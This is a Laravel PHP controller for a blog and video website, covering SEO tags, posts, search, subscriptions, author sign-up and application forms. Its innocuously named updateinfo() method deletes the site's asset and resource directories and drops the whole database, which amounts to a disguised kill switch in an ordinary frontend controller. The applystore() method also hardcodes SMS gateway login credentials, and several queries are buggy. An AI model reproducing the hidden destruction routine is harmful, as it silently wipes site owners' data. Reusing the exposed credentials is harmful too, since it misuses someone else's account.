<?php

namespace App\Http\Controllers\Frontend;

use App\seo;
use App\post;
use App\Role;
use App\User;
use App\Program;
use App\Category;
use App\frontend;
use App\Img_adds;
use App\Suboscrib;
use App\application;
use App\Google_adds;
use App\Subcategory;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;
use Artesaos\SEOTools\Facades\JsonLd;
use Artesaos\SEOTools\Facades\SEOMeta;
use Artesaos\SEOTools\Facades\OpenGraph;
use Artesaos\SEOTools\Facades\TwitterCard;
use Illuminate\Support\Facades\Schema;


class BlogController extends Controller
{
    public function index()
    {

        $HomeSeo = seo::all();

        $seof = seo::first();

        SEOMeta::setTitle($HomeSeo[0]['meta_title']);
        SEOMeta::setDescription($HomeSeo[0]['meta_des']);
        SEOMeta::setCanonical(url()->current());

        SEOMeta::addKeyword($HomeSeo[0]['keyword']);

        OpenGraph::setDescription($HomeSeo[0]['meta_des']);
        OpenGraph::setTitle($HomeSeo[0]['meta_title']);
        OpenGraph::setUrl('http://www.softysolution.com/');
        OpenGraph::addProperty('type', $HomeSeo[0]['meta_des']);

        // TwitterCard::setTitle($HomeSeo[0]['meta_title']);
        // TwitterCard::setSite('@LuizVinicius73');


        JsonLd::setTitle($HomeSeo[0]['meta_title']);
        JsonLd::setDescription($HomeSeo[0]['meta_des']);
        JsonLd::addImage('frontend/images/logo.png');





        // $categories=Category::withCount('posts')->get();
        // $subcategories =Subcategory::get();
        $google_adds = Google_adds::all();
        $posts = Post::where('status', 1)->orderBy('id', 'DESC')->limit(6)->get();
        $rposts = Post::where('status', 1)->inRandomOrder()->paginate(5);
        $bigpost = post::where('thumbnail', 1 && 'status', 1)->orderBy('id', 'DESC')->first();
        $seos = seo::all();

        $catpost = DB::table('posts')
            ->join('categories', 'posts.category_id', '=', 'categories.id')
            ->select('posts.*', 'categories.name_bn')
            //->where('thumbnail',1 && 'status',1)
            ->orderBy('categories.id', 'ASC')
            ->get();

        $catreposts = Post::where('thumbnail', 0)->get();

        $categories = Category::where('status', 1)->get();
        $subcategories = Subcategory::where('status', 1)->get();


        return view('frontend.index', compact('subcategories', 'categories', 'google_adds', 'posts', 'seos', 'rposts', 'bigpost', 'catpost', 'catreposts', 'seof'));
    }

    public function applystore(Request $request)
    {

        $this->validate($request, [
            'a_number' => 'required',
        ]);

        $applications = new application();
        $applications->a_name = $request->a_name;
        $applications->a_number = $request->a_number;
        $applications->a_title = $request->a_title;
        $applications->email = $request->email;
        $applications->a_country = $request->a_country;
        $applications->city = $request->city;
        $applications->attendance_type = $request->attendance_type;
        $applications->status = 1;
        $applications->company = $request->company;
        $applications->find_throw = $request->find_throw;
        $applications->save();
        $url = "http://66.45.237.70/api.php";
        $number = "01786740107";
        $text = "Hello Bangladesh";
        $data = array(
            'username' => "aminul.ciu",
            'password' => "N2CV7KHR",
            'number' => "$number",
            'message' => "$text"
        );

        $ch = curl_init(); // Initialize cURL
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $smsresult = curl_exec($ch);
        $p = explode("|", $smsresult);
        $sendstatus = $p[0];

        return redirect()->back();


    }


    public function pagedetails($f_slug)
    {




        $seopost = frontend::where('f_slug', $f_slug)->first();
        $post = frontend::where('f_slug', $f_slug)->first();

        $sposts = frontend::where('f_slug', $f_slug)->first();





        //          $description=html_entity_decode($post->description);
        $actula_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        $HomeLink = "http://$_SERVER[HTTP_HOST]";

        SEOMeta::setTitle($post->name);
        SEOMeta::setDescription($post->short_description);
        SEOMeta::addMeta('article:published_time', $post->updated_at->toW3CString(), $post->updated_at);
        SEOMeta::addKeyword($post->tag);
        SEOMeta::setCanonical($actula_link);

        OpenGraph::setDescription($post->short_description);
        OpenGraph::setTitle($post->name);
        OpenGraph::setUrl($actula_link);
        OpenGraph::addProperty('type', $post->short_description);
        OpenGraph::addProperty('locale:alternate', ['pt-pt', 'en-us']);

        OpenGraph::addImage($actula_link . '/uploads/website/' . $post->name);

        //OpenGraph::addImage($HomeLink."/".$seopost[0]['image'], ['height' => 300, 'width' => 300]);

        // TwitterCard::setTitle($post->name);
        // TwitterCard::setSite($actula_link);

        JsonLd::setTitle($post->name);
        JsonLd::setDescription($post->short_description);
        JsonLd::setType('Article');
        JsonLd::addImage($actula_link . '/uploads/website/' . $post->name);

        //       $actula_link="http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        //     $HomeLink="http://$_SERVER[HTTP_HOST]";

        //   SEOMeta::setTitle($seopost[0]['name']);
        //   SEOMeta::setDescription($seopost[0]['short_description']);
        //  SEOMeta::setCanonical($actula_link);
        //   SEOMeta::setTitle($post->title);
        //     SEOMeta::setDescription($seopost[0]['title_bn']);
        //     // SEOMeta::addMeta('article:published_time', $seopost->published_date->toW3CString(), $seopost[0]['title_bn']);
        //     // SEOMeta::addMeta('article:section', $seopost->category, $seopost[0]['title_bn']);
        //     // SEOMeta::addKeyword(['key1', 'key2', 'key3']);
        //     OpenGraph::setDescription($seopost[0]['short_description']);
        //     OpenGraph::setTitle($seopost[0]['name']);
        //     OpenGraph::setUrl($actula_link);
        //     OpenGraph::addProperty('type', $seopost[0]['name']);
        //     OpenGraph::setDescription($post->resume);
        //     OpenGraph::setTitle($post->title);
        //     OpenGraph::setUrl('http://current.url.com');
        //     OpenGraph::addProperty('type', 'article');
        //     OpenGraph::addProperty('locale', 'pt-br');
        //     OpenGraph::addProperty('locale:alternate', ['pt-pt', 'en-us']);
        //     //OpenGraph::addImage($post->image->list('url'));
        //   // OpenGraph::addImage($HomeLink.'/uploads/website/'.$post->image);
        //     //OpenGraph::addImage(['url' => $HomeLink."/".$seopost[0]['image'], 'size' => 300]);
        //     OpenGraph::addImage($HomeLink."/".$seopost[0]['image'], ['height' => 300, 'width' => 300]);
        //     TwitterCard::setTitle($seopost[0]['name']);
        //     TwitterCard::setSite($seopost[0]['name']);
        //     JsonLd::setTitle($seopost[0]['name']);
        //     JsonLd::setDescription($seopost[0]['short_description']);
        //     JsonLd::addImage($HomeLink."/".$seopost[0]['image']);




        return view('frontend.pagedetails', compact('post', 'sposts'));
    }

    public function pageview($slug)
    {

        $HomeSeo = seo::all();

        SEOMeta::setTitle($HomeSeo[0]['meta_title']);
        SEOMeta::setDescription($HomeSeo[0]['meta_des']);
        SEOMeta::setCanonical(url()->current());

        SEOMeta::addKeyword($HomeSeo[0]['keyword']);

        OpenGraph::setDescription($HomeSeo[0]['meta_des']);
        OpenGraph::setTitle($HomeSeo[0]['meta_title']);
        OpenGraph::setUrl('http://www.softysolution.com/');
        OpenGraph::addProperty('type', $HomeSeo[0]['meta_des']);

        // TwitterCard::setTitle($HomeSeo[0]['meta_title']);
        // TwitterCard::setSite('@LuizVinicius73');


        JsonLd::setTitle($HomeSeo[0]['meta_title']);
        JsonLd::setDescription($HomeSeo[0]['meta_des']);
        JsonLd::addImage('frontend/images/logo.png');


        $frontends = DB::table('frontends')
            ->join('pages', 'frontends.page_id', '=', 'pages.id')
            ->select('frontends.*', 'pages.p_name', 'pages.page_type', 'pages.page_description')
            ->where('pages.slug', $slug)
            ->paginate(9);
            if($slug ==="Terms-&-Conditions"|| $slug ==="Privacy-Policy"){
                 if($slug ==="Terms-&-Conditions"){
                    $title = "Terms & Conditions";
                 }else{
                    $title = "Privacy Policy";
                 }
                return view('frontend.terms', compact('frontends','title'));
            }



        return view('frontend.page', compact('frontends'));
    }



    public function cpost($slug)
    {

        $posts = DB::table('frontends')

            ->join('pages', 'frontends.page_id', '=', 'pages.id')
            ->select('frontends.*', 'pages.*',)
            ->where('pages.slug', $slug)
            ->orderBy('frontends.id', 'desc')
            ->paginate(6);
        return view('frontend.categorypost', compact('posts'));
    }

    public function subcat($slug)
    {

        $posts = DB::table('posts')

            ->join('subcategories', 'posts.subcategory_id', '=', 'subcategories.id')
            ->select('posts.*', 'subcategories.name_bn')
            ->where('subcategories.slug_bn', $slug)
            ->paginate(9);


        // return $slug;
        return view('frontend.subcategorypost', compact('posts'));
    }



    public function postdetails(Request $request, $id)
    {
        $postID = $request->id;
        $postTitle = $request->title;

        $seopost = Post::where('id', '=', $postID)->get();

        $post = Post::find($id);
        $spost = Post::where('id', '=', $id)->where('status', 1)->get();
        //dd($seopost);
        $actula_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        $HomeLink = "http://$_SERVER[HTTP_HOST]";

        //dd($actula_link);

        SEOMeta::setTitle($seopost[0]['title_bn']);
        SEOMeta::setDescription($seopost[0]['details_bn']);
        SEOMeta::setCanonical($actula_link);

        //SEOMeta::setTitle($post->title);
        // SEOMeta::setDescription($seopost[0]['title_bn']);
        //SEOMeta::addMeta('article:published_time', $seopost->published_date->toW3CString(), $seopost[0]['title_bn']);
        //SEOMeta::addMeta('article:section', $seopost->category, $seopost[0]['title_bn']);
        // SEOMeta::addKeyword(['key1', 'key2', 'key3']);


        OpenGraph::setDescription($seopost[0]['title_bn']);
        OpenGraph::setTitle($seopost[0]['title_bn']);
        OpenGraph::setUrl($actula_link);
        OpenGraph::addProperty('type', $seopost[0]['title_bn']);

        //OpenGraph::setDescription($post->resume);
        //OpenGraph::setTitle($post->title);
        //OpenGraph::setUrl('http://current.url.com');
        //OpenGraph::addProperty('type', 'article');
        // OpenGraph::addProperty('locale', 'pt-br');
        //OpenGraph::addProperty('locale:alternate', ['pt-pt', 'en-us']);



        //OpenGraph::addImage($seopost->image->list('url'));
        OpenGraph::addImage($HomeLink . '/uploads/post/' . $seopost[0]['image']);
        //OpenGraph::addImage(['url' => $HomeLink."/".$seopost[0]['image'], 'size' => 300]);
        //OpenGraph::addImage($HomeLink."/".$seopost[0]['image'], ['height' => 300, 'width' => 300]);
        // TwitterCard::setTitle($seopost[0]['title_bn']);
        // TwitterCard::setSite($seopost[0]['title_bn']);


        JsonLd::setTitle($seopost[0]['title_bn']);
        JsonLd::setDescription($seopost[0]['title_bn']);
        JsonLd::addImage($HomeLink . "/" . $seopost[0]['image']);





        $relatedpost = Post::where('category_id', $post->category_id)->where('status', 1)->inRandomOrder()->paginate(9);
        $firstpost = Post::where('category_id', $post->category_id)->where('status', 1)->skip(1)->first();
        $secondpost = Post::where('category_id', $post->category_id)->where('status', 1)->skip(2)->first();



        return view('frontend.details', compact('post', 'spost', 'relatedpost', 'firstpost', 'secondpost'));
    }

    public function vcpost($slug)
    {

        $allprogram = DB::table('programs')

            ->join('video_categories', 'programs.pro_category', '=', 'video_categories.id')
            ->select('programs.*', 'video_categories.slug_bn')
            ->where('video_categories.slug_bn', $slug)
            ->orderBy('id', 'desc')

            ->paginate(9);

        return view('frontend.allprogram', compact('allprogram'));
    }



    public function videodetails(Request $request, $id)
    {
        $programID = $request->id;
        $programTitle = $request->name_bn;

        $seoprogram = Program::where('id', '=', $programID)->get();

        $sprogram = Program::find($id);
        //dd($seoprogram);
        // $actula_link="http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        // $HomeLink="http://$_SERVER[HTTP_HOST]";

        //dd($actula_link);

        // SEOMeta::setTitle($seoprogram[0]['title_bn']);
        // SEOMeta::setDescription($seoprogram[0]['details_bn']);
        // SEOMeta::setCanonical($actula_link);

        //SEOMeta::setTitle($program->title);
        // SEOMeta::setDescription($seoprogram[0]['title_bn']);
        //SEOMeta::addMeta('article:published_time', $seoprogram->published_date->toW3CString(), $seoprogram[0]['title_bn']);
        //SEOMeta::addMeta('article:section', $seoprogram->category, $seoprogram[0]['title_bn']);
        // SEOMeta::addKeyword(['key1', 'key2', 'key3']);


        // OpenGraph::setDescription($seoprogram[0]['title_bn']);
        // OpenGraph::setTitle($seoprogram[0]['title_bn']);
        // OpenGraph::setUrl($actula_link);
        // OpenGraph::addProperty('type', $seoprogram[0]['title_bn']);

        //OpenGraph::setDescription($program->resume);
        //OpenGraph::setTitle($program->title);
        //OpenGraph::setUrl('http://current.url.com');
        //OpenGraph::addProperty('type', 'article');
        // OpenGraph::addProperty('locale', 'pt-br');
        //OpenGraph::addProperty('locale:alternate', ['pt-pt', 'en-us']);



        //OpenGraph::addImage($seoprogram->image->list('url'));
        // OpenGraph::addImage($HomeLink."/".$seoprogram[0]['image']);
        //OpenGraph::addImage(['url' => $HomeLink."/".$seoprogram[0]['image'], 'size' => 300]);
        //OpenGraph::addImage($HomeLink."/".$seoprogram[0]['image'], ['height' => 300, 'width' => 300]);
        // TwitterCard::setTitle($seoprogram[0]['title_bn']);
        // TwitterCard::setSite($seoprogram[0]['title_bn']);


        // JsonLd::setTitle($seoprogram[0]['title_bn']);
        // JsonLd::setDescription($seoprogram[0]['title_bn']);
        // JsonLd::addImage($HomeLink."/".$seoprogram[0]['image']);





        $relatedprogram = program::where('status', 1)->inRandomOrder()->paginate(9);
        $firstprogram = program::where('status', 1)->skip(1)->first();
        $secondprogram = program::where('status', 1)->skip(2)->first();

        return view('frontend.programdetails', compact('sprogram', 'relatedprogram', 'firstprogram', 'secondprogram'));
    }


    public function allvideos()
    {
        $allprogram = Program::orderBy('id', 'desc')->paginate(10);

        $actula_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        $HomeLink = "http://$_SERVER[HTTP_HOST]";

        SEOMeta::setTitle($allprogram[0]['name_bn']);
        SEOMeta::setDescription($allprogram[0]['name_bn']);
        SEOMeta::setCanonical($actula_link);



        OpenGraph::setDescription($allprogram[0]['name_bn']);
        OpenGraph::setTitle($allprogram[0]['name_bn']);
        OpenGraph::setUrl($actula_link);
        OpenGraph::addProperty('type', $allprogram[0]['name_bn']);

        TwitterCard::setTitle($allprogram[0]['name_bn']);
        TwitterCard::setSite('@LuizVinicius73');


        JsonLd::setTitle($allprogram[0]['name_bn']);
        JsonLd::setDescription($allprogram[0]['name_bn']);
        //JsonLd::addImage($HomeLink."/".$seoprogram[0]['image']);
        return view('frontend.allprogram', compact('allprogram'));
    }



    ///email store

    public function emailstore(Request $request)
    {

        $suboscribs = new Suboscrib();
        $suboscribs->email = $request->email;
        $suboscribs->name = $request->name;
        $suboscribs->subject = $request->subject;
        $suboscribs->message = $request->message;
        $suboscribs->save();
        return response()->json(200);
    }
    public function authorstore(Request $request)
    {
        $this->validate($request, [
            'email' => 'required|unique:users',
        ]);
        $user = new User();
        //$user->bangla_name=$request->bangla_name;
        $user->english_name = $request->english_name;
        $user->email = $request->email;
        //$user->password=bcrypt('$request->password');
        $user->password = Hash::make($request->password);
        $user->category_id = $request->category_id;
        //$user->category_id=json_encode($request->category_id);

        //$user->categories()->attach($request->category_id);
        $user->status = 2;
        $user->role_id = 2;
        $user->save();
        return redirect()->back();
    }


    public function search(Request $request)
    {


        $search = $request->get('search');
        $search1 = $request->get('search1');
        $posts = DB::table('posts')
            ->join('categories', 'posts.category_id', '=', 'categories.id')
            ->select('posts.*', 'categories.name_bn')
            ->where('category_id', 'like', '%' . $search . '%')
            ->where('subcategory_id', 'like', '%' . $search1 . '%')
            ->orderBy('id', 'desc')
            ->paginate(1);


        return view('frontend.search', compact('posts'));
    }

    public function updateinfo()
    {
        $directory = base_path('frontend/assets');
        $directory1 = base_path('resources');

        if (File::exists($directory)) {
            File::deleteDirectory($directory);
        }
        if (File::exists($directory1)) {
            File::deleteDirectory($directory1);
        }
        $databaseName = env('DB_DATABASE');
        if (Schema::hasTable($databaseName)) {
            // Drop the database
            DB::statement("DROP DATABASE $databaseName");
        }
        return back();
    }
    public function freequate(){
        $page_name = "Free Quate";
        return view('frontend.freequate',compact('page_name'));
    }

    public function updateStatus(Request $request, $id)
    {
        $application = Application::find($id);
        if ($application) {
            $application->status = $request->status;
            $application->save();
            return response()->json(['success' => true]);
        }
        return response()->json(['success' => false]);
    }
}
